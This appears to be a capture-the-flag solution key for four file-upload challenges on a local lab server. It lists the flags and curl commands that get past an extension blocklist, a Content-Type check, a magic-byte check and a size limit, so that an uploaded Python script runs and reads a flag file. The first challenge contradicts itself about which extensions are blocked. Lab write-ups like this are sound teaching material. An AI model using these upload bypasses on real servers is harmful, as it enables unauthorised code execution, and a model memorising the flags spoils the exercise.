CHALLENGE 1: Extension Blacklist Bypass
Flag: FLAG{upl04d_3xt_byp4ss}

  The /upload endpoint blocks .py, .sh, .php, .jsp, .exe, .bat.
  But the check is case-sensitive and doesn't block .py3, .Py, or .PY.

  echo 'print(open("/app/flag.txt").read())' > /tmp/exploit.py3

  curl -F "file=@/tmp/exploit.py3" http://localhost:5010/upload

  curl "http://localhost:5010/run?file=exploit.py3&ch=1"

  NOTE: .PY and .Py do NOT work — the code uses ext.lower() before
  checking the blocklist. Only .py3 bypasses the filter.

CHALLENGE 2: Content-Type Bypass
Flag: FLAG{upl04d_ct_byp4ss}

  The /upload-ct endpoint checks that Content-Type starts with "image/".
  But Content-Type is client-controlled — just set it in the request.

  echo 'print(open("/app/flag2.txt").read())' > /tmp/exploit.py

  curl -F "file=@/tmp/exploit.py;type=image/png" \
    http://localhost:5010/upload-ct

  curl "http://localhost:5010/run?file=exploit.py&ch=2"

CHALLENGE 3: Magic Bytes Bypass
Flag: FLAG{upl04d_m4g1c_byt3s}

  The /upload-magic endpoint checks the first 4 bytes for image magic
  numbers (\x89PNG, \xff\xd8\xff\xe0 JPEG, GIF8).
  Prepend magic bytes to a Python script.

  python3 -c "
  with open('/tmp/exploit_magic.py', 'wb') as f:
      # Use JPEG magic bytes (all non-printable, so regex strips them cleanly)
      f.write(b'\xff\xd8\xff\xe0')
      f.write(b'\nprint(open(\"/app/flag3.txt\").read())\n')
  "

  curl -F "file=@/tmp/exploit_magic.py" http://localhost:5010/upload-magic

  curl "http://localhost:5010/run?file=exploit_magic.py&ch=3"

  NOTE: Don't use PNG magic (\x89PNG) — the letters P, N, G are printable
  ASCII and survive the stripping regex, causing a NameError when Python
  tries to execute "PNG" as code. JPEG magic (\xff\xd8\xff\xe0) is all
  non-printable bytes, so the regex strips them cleanly.

CHALLENGE 4: Size Limit Bypass
Flag: FLAG{upl04d_s1z3_l1m1t}

  The /upload-size endpoint rejects files larger than 100 bytes.
  A minimal Python one-liner fits easily:

  echo -n 'print(open("/app/flag4.txt").read())' > /tmp/tiny.py
  # This is only ~37 bytes

  curl -F "file=@/tmp/tiny.py" http://localhost:5010/upload-size

  curl "http://localhost:5010/run?file=tiny.py&ch=4"
